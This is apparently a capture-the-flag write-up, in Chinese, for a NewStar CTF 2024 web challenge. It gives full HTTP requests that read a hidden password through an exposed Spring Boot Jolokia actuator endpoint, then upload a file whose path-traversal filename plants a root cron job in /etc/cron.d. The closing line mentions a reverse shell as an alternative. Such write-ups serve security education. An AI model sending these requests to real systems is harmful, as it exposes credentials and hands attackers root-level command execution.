---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# 隐藏的密码

根据题目隐藏的密码可能是存在信息泄露，进行目录扫描，可以扫到env和jolokia端点，可以找到caef11.passwd属性是隐藏的

```http
POST /actuator/jolokia
Content-Type: application/json

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["caef11.passwd"]}
```

读到密码后，根据题目描述和属性的名字可得用户名为caef11

```http
POST /upload HTTP/1.1
Host: 45.136.15.177:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Referer: http://45.136.15.177:8080/ccd14bfa-33a9-328e-85ad-f5bb028f4d4c
Origin: http://45.136.15.177:8080
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------299910828237697550873740693503
Cookie: PHPSESSID=kc8dfc8njb57d311qlmh7ij0d2; JSESSIONID=E1EF0128A9A427C2593DA64FAE3E2102
Content-Length: 266

-----------------------------299910828237697550873740693503
Content-Disposition: form-data; name="file"; filename="../etc/cron.d/testt"
Content-Type: application/octet-stream

*/1 * * * * root cat /flag | xargs -I {} touch /{}

-----------------------------299910828237697550873740693503--
```

以flag为文件名在根目录创建新文件，通过ls查看flag,或者反弹shell也可以
